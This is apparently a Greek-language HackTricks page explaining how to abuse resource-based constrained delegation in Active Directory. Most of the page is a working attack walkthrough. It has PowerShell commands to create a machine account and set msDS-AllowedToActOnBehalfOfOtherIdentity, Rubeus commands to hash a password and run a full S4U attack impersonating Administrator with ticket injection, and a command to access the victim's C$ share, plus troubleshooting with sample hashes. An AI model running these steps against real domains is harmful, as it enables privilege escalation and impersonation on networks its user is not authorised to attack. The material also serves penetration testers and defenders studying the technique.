# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Αυτό είναι παρόμοιο με την βασική [Constrained Delegation](constrained-delegation.md) αλλά **αντί** να δίνει δικαιώματα σε ένα **αντικείμενο** να **παριστάνει οποιονδήποτε χρήστη απέναντι σε μια υπηρεσία**. Η Resource-based Constrained Delegation **ορίζει** στο **αντικείμενο ποιος μπορεί να παριστάνει οποιονδήποτε χρήστη απέναντι σε αυτό**.

Σε αυτή την περίπτωση, το περιορισμένο αντικείμενο θα έχει ένα χαρακτηριστικό που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ με το όνομα του χρήστη που μπορεί να παριστάνει οποιονδήποτε άλλο χρήστη απέναντι σε αυτό.

Μια άλλη σημαντική διαφορά από αυτή την Constrained Delegation σε άλλες delegations είναι ότι οποιοσδήποτε χρήστης με **δικαιώματα εγγραφής σε έναν λογαριασμό μηχανής** (_GenericAll/GenericWrite/WriteDacl/WriteProperty κ.λπ.) μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (Στις άλλες μορφές Delegation χρειάζεστε δικαιώματα διαχειριστή τομέα).

### New Concepts

Πίσω στην Constrained Delegation είχε αναφερθεί ότι η **`TrustedToAuthForDelegation`** σημαία μέσα στην τιμή _userAccountControl_ του χρήστη είναι απαραίτητη για να εκτελέσετε ένα **S4U2Self.** Αλλά αυτό δεν είναι εντελώς αλήθεια.\
Η πραγματικότητα είναι ότι ακόμα και χωρίς αυτή την τιμή, μπορείτε να εκτελέσετε ένα **S4U2Self** απέναντι σε οποιονδήποτε χρήστη αν είστε μια **υπηρεσία** (έχετε ένα SPN) αλλά, αν έχετε **`TrustedToAuthForDelegation`** το επιστρεφόμενο TGS θα είναι **Forwardable** και αν **δεν έχετε** αυτή τη σημαία το επιστρεφόμενο TGS **δεν θα** είναι **Forwardable**.

Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** είναι **NOT Forwardable** προσπαθώντας να εκμεταλλευτείτε μια **βασική Constrain Delegation** δεν **θα λειτουργήσει**. Αλλά αν προσπαθείτε να εκμεταλλευτείτε μια **Resource-Based constrain delegation, θα λειτουργήσει** (αυτό δεν είναι ευπάθεια, είναι χαρακτηριστικό, προφανώς).

### Attack structure

> Αν έχετε **δικαιώματα εγγραφής ισοδύναμα** σε έναν **λογαριασμό Υπολογιστή** μπορείτε να αποκτήσετε **προνομιακή πρόσβαση** σε αυτή τη μηχανή.

Υποθέστε ότι ο επιτιθέμενος έχει ήδη **δικαιώματα εγγραφής ισοδύναμα πάνω στον υπολογιστή θύμα**.

1. Ο επιτιθέμενος **παραβιάζει** έναν λογαριασμό που έχει ένα **SPN** ή **δημιουργεί έναν** (“Service A”). Σημειώστε ότι **οποιοσδήποτε** _Admin User_ χωρίς καμία άλλη ειδική προνόμια μπορεί να **δημιουργήσει** μέχρι 10 **Computer objects (**_**MachineAccountQuota**_**)** και να τους ορίσει ένα **SPN**. Έτσι, ο επιτιθέμενος μπορεί απλά να δημιουργήσει ένα αντικείμενο υπολογιστή και να ορίσει ένα SPN.
2. Ο επιτιθέμενος **καταχράται το δικαίωμα ΕΓΓΡΑΦΗΣ** πάνω στον υπολογιστή θύμα (ServiceB) για να ρυθμίσει **resource-based constrained delegation ώστε να επιτρέπει στο ServiceA να παριστάνει οποιονδήποτε χρήστη** απέναντι σε αυτόν τον υπολογιστή θύμα (ServiceB).
3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από το Service A στο Service B για έναν χρήστη **με προνομιακή πρόσβαση στο Service B**.
1. S4U2Self (από τον λογαριασμό SPN που παραβιάστηκε/δημιουργήθηκε): Ζητήστε ένα **TGS του Administrator για μένα** (Not Forwardable).
2. S4U2Proxy: Χρησιμοποιήστε το **όχι Forwardable TGS** του βήματος πριν για να ζητήσετε ένα **TGS** από τον **Administrator** προς τον **υπολογιστή θύμα**.
3. Ακόμα και αν χρησιμοποιείτε ένα όχι Forwardable TGS, καθώς εκμεταλλεύεστε την Resource-based constrained delegation, θα λειτουργήσει.
4. Ο επιτιθέμενος μπορεί να **περάσει το εισιτήριο** και να **παριστάνει** τον χρήστη για να αποκτήσει **πρόσβαση στην υπηρεσία θύμα ServiceB**.

Για να ελέγξετε το _**MachineAccountQuota**_ του τομέα μπορείτε να χρησιμοποιήσετε:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία Αντικειμένου Υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στο τομέα χρησιμοποιώντας [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Ρύθμιση R**esource-based Constrained Delegation**

**Χρησιμοποιώντας το module PowerShell του activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρησιμοποιώντας το powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση μιας πλήρους επίθεσης S4U

Πρώτα απ' όλα, δημιουργήσαμε το νέο αντικείμενο Υπολογιστή με τον κωδικό πρόσβασης `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τους κατακερματισμούς RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, η επίθεση μπορεί να εκτελεστεί:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα εισιτήρια απλά ζητώντας μία φορά χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Σημειώστε ότι οι χρήστες έχουν ένα χαρακτηριστικό που ονομάζεται "**Cannot be delegated**". Αν ένας χρήστης έχει αυτό το χαρακτηριστικό σε True, δεν θα μπορείτε να τον προσποιηθείτε. Αυτή η ιδιότητα μπορεί να φαίνεται μέσα στο bloodhound.

### Accessing

Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη επίθεση S4U και θα εισάγει το TGS** από τον Administrator στον θύμα υπολογιστή στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, οπότε θα μπορείτε να έχετε πρόσβαση στο **C$**:
```bash
ls \\victim.domain.local\C$
```
### Κατάχρηση διαφόρων υπηρεσιών εισιτηρίων

Μάθετε για τα [**διαθέσιμα εισιτήρια υπηρεσιών εδώ**](silver-ticket.md#available-services).

## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos είναι ρυθμισμένο να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το hash RC4. Παρέχετε στο Rubeus τουλάχιστον το hash AES256 (ή απλά παρέχετε του τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή είναι διαφορετική από αυτή του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το δεδομένο όνομα χρήστη + hashes δεν λειτουργούν για είσοδο. Μπορεί να έχετε ξεχάσει να βάλετε το "$" μέσα στο όνομα χρήστη κατά την παραγωγή των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
  - Ο χρήστης που προσπαθείτε να μιμηθείτε δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον μιμηθείτε ή επειδή δεν έχει αρκετά δικαιώματα)
  - Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητήσετε ένα εισιτήριο για winrm αλλά το winrm δεν εκτελείται)
  - Ο ψεύτικος υπολογιστής που δημιουργήθηκε έχει χάσει τα δικαιώματά του πάνω στον ευάλωτο διακομιστή και πρέπει να τα επιστρέψετε.

## Αναφορές

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)


{{#include ../../banners/hacktricks-training.md}}
